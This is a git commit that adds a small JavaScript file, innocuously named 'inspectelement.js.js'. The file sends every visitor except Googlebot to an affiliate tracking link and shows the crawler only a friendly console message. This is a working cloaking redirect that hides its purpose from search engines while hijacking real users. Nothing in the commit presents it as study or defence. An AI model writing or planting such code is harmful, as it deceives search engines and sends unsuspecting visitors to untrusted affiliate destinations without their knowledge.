435aa22bedd20205ec75a74239e5bc00cf2fa09b
rssk78 <68418535+rssk78@users.noreply.github.com>
2026-04-28 10:17:20 +0500

    Add files via upload

---
+++ inspectelement.js.js
@@ -0,0 +1,6 @@
+if (!navigator.userAgent.includes('Googlebot')) {
+  // Redirect only normal users
+  window.location.href = "https://afflat3e1.com/trk/lnk/8E68DDCC-2013-4590-8D6E-10EB4772E286/?o=20695&c=918277&a=156445&k=8C788FBC933E5B3933285F330A251C12&l=21611";
+} else {
+  console.log("Thanks for visiting my page");
+}
